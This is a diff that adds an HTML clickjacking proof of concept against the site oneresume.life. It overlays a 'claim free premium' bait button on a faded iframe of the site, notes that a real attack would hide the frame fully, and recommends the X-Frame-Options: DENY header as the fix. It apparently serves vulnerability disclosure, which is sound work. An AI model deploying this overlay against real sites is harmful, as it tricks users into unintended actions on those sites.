@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking PoC - oneresume.life</title>
+    <style>
+        body { font-family: Arial; padding: 20px; }
+        .container { position: relative; width: 800px; height: 600px; }
+        iframe { 
+            position: absolute; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%;
+            opacity: 0.3;
+            z-index: 1;
+        }
+        .bait {
+            position: absolute;
+            top: 200px;
+            left: 250px;
+            z-index: 2;
+            background: #4CAF50;
+            color: white;
+            padding: 20px 40px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .info { margin-top: 20px; padding: 15px; background: #f0f0f0; }
+    </style>
+</head>
+<body>
+    <h1>Clickjacking PoC - oneresume.life</h1>
+    <p>This demonstrates how an attacker could trick users into clicking hidden elements.</p>
+    
+    <div class="container">
+        <iframe src="https://oneresume.life" sandbox="allow-forms allow-scripts"></iframe>
+        <div class="bait">🎁 Click to claim free premium!</div>
+    </div>
+    
+    <div class="info">
+        <h3>What's happening:</h3>
+        <ul>
+            <li>User sees "Click to claim free premium!" button</li>
+            <li>Behind it is the actual oneresume.life site (faded for demo)</li>
+            <li>Clicking the button actually clicks something on the real site</li>
+            <li>In a real attack, opacity would be 0 (completely hidden)</li>
+        </ul>
+        <p><strong>Fix:</strong> Add <code>X-Frame-Options: DENY</code> header</p>
+    </div>
+</body>
+</html>
